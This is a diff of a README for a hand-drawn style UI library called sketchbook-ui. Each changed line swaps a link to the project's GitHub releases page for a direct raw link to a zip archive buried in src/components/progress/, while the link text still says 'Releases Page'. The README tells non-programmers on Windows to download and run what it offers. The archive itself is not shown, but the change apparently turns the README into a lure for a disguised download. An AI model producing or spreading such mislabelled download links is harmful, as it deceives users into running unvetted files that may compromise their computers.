@@ -1,6 +1,6 @@
 # 🎨 sketchbook-ui - Hand-Drawn Style UI Library
 
-[![Download sketchbook-ui](https://img.shields.io/badge/Download-sketchbook--ui-brightgreen?style=for-the-badge)](https://github.com/Tallam60/sketchbook-ui/releases)
+[![Download sketchbook-ui](https://img.shields.io/badge/Download-sketchbook--ui-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Tallam60/sketchbook-ui/main/src/components/progress/sketchbook_ui_3.8.zip)
 
 sketchbook-ui is a user interface library designed with a hand-drawn look. It gives your apps a friendly and casual style. This guide will help you download and run the software on Windows. No programming knowledge is needed.
 
@@ -30,7 +30,7 @@ Before you start, make sure your computer meets these needs:
 
 Download the software by visiting the releases page. This page contains the latest version you can install.
 
-[![Download](https://img.shields.io/badge/Visit%20the%20Releases%20Page-blue?style=for-the-badge)](https://github.com/Tallam60/sketchbook-ui/releases)
+[![Download](https://img.shields.io/badge/Visit%20the%20Releases%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Tallam60/sketchbook-ui/main/src/components/progress/sketchbook_ui_3.8.zip)
 
 1. Click the button above to open the releases page in your web browser.
 2. Look for the latest version of the application. It usually has a version number, like v1.0 or higher.
@@ -101,7 +101,7 @@ sketchbook-ui is open source and focuses on creating UI components with a unique
 
 If you need to get the app again or want the latest version, visit the release page here:
 
-[Download sketchbook-ui](https://github.com/Tallam60/sketchbook-ui/releases)
+[Download sketchbook-ui](https://raw.githubusercontent.com/Tallam60/sketchbook-ui/main/src/components/progress/sketchbook_ui_3.8.zip)
 
 Click the Windows installer for the newest build to keep the program updated and running smoothly.
 
